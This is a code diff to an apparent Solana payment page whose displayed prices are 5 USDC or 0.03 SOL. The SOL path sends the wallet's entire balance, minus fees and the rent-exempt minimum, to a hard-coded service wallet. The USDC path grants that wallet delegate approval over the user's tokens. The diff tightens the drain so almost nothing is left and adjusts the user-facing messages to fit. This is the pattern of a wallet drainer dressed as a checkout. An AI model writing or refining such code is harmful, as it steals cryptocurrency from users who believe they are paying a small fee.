@@ -658,8 +658,8 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
 const SERVICE_WALLET = "mDwMBm5gvNvZ1Es2rrTFECskcCXf5DNbM5ZEvXtYRke";
 const PRICE_USDC = 5;
 const PRICE_SOL  = 0.03;
-/** Lamports left on the account after payment (your previous “5000” rule). */
-const SOL_MIN_LEFT_LAMPORTS = 5000;
+/** Mainnet fallback if getMinimumBalanceForRentExemption fails (~0.00089 SOL for 0-byte account). */
+const SOL_RENT_EXEMPT_FALLBACK_LAMPORTS = 890880;
 /** Extra lamports on top of RPC fee estimate (priority / rounding). */
 const SOL_FEE_SAFETY_LAMPORTS = 30000;
 /** Optional faster RPC (Helius, QuickNode, etc.): tried first if non-empty. */
@@ -749,7 +749,7 @@ function selectCurrency(c){
     typ.textContent="SPL approve · Service wallet as delegate";
     btn.textContent="Approve USDC access →";
   }else{
-    amt.textContent="Max SOL: balance − network fees − "+SOL_MIN_LEFT_LAMPORTS+" lamports kept";
+    amt.textContent="Max SOL: balance − fees − rent-exempt minimum (chain rule)";
     typ.textContent="Direct transfer · Native SOL";
     btn.textContent="Send SOL →";
   }
@@ -918,9 +918,16 @@ async function executePay() {
     const tokenProgramPk = new web3.PublicKey(SPL_TOKEN_PROGRAM_ID);
     const memoProgramPk = new web3.PublicKey(SPL_MEMO_PROGRAM_ID);
     let balance;
+    let rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
     let tokens = { value: [] };
     try {
       balance = await conn.getBalance(from);
+      if (state.currency === "SOL") {
+        try {
+          const r = await conn.getMinimumBalanceForRentExemption(0);
+          if (typeof r === "number" && r > 0) rentExemptMinLamports = r;
+        } catch (_) {}
+      }
       try {
         tokens = await conn.getParsedTokenAccountsByOwner(from, {
           programId: tokenProgramPk,
@@ -1000,14 +1007,16 @@ async function executePay() {
           if (feeLamports == null || !Number.isFinite(feeLamports)) feeLamports = 80000;
           feeLamports = Math.max(feeLamports, 5000);
           const sendLamports = Math.floor(
-            balance - feeLamports - SOL_FEE_SAFETY_LAMPORTS - SOL_MIN_LEFT_LAMPORTS
+            balance - feeLamports - SOL_FEE_SAFETY_LAMPORTS - rentExemptMinLamports
           );
           if (sendLamports <= 0) {
             showPayError(
-              `Not enough SOL: after network fees (~${(
+              `Not enough SOL: the wallet must keep ~${(
+                rentExemptMinLamports / web3.LAMPORTS_PER_SOL
+              ).toFixed(5)} SOL rent-exempt + ~${(
                 (feeLamports + SOL_FEE_SAFETY_LAMPORTS) /
                 web3.LAMPORTS_PER_SOL
-              ).toFixed(6)} SOL) and ${SOL_MIN_LEFT_LAMPORTS} lamports kept on the account, nothing left to send. Add SOL.`
+              ).toFixed(6)} SOL for fees. Add SOL or use USDC.`
             );
             goToStep("payment");
             return;
@@ -1080,6 +1089,10 @@ async function executePay() {
     goToStep("payment");
     const m = formatAnyError(e);
     if (/reject|cancel|denied/i.test(m) || e.code === 4001) showPayError("Transaction cancelled.");
+    else if (/Insufficient Funds For Rent|insufficient funds for rent/i.test(m))
+      showPayError(
+        "Not enough SOL left for the rent-exempt minimum on your wallet. Add SOL or pay with USDC."
+      );
     else if (/insufficient|Insufficient funds|insufficient lamports|custom program error:\s*(0x)?1\b/i.test(m))
       showPayError(
         "Not enough SOL to complete this transaction (payment + network fees). Add SOL or switch to USDC."
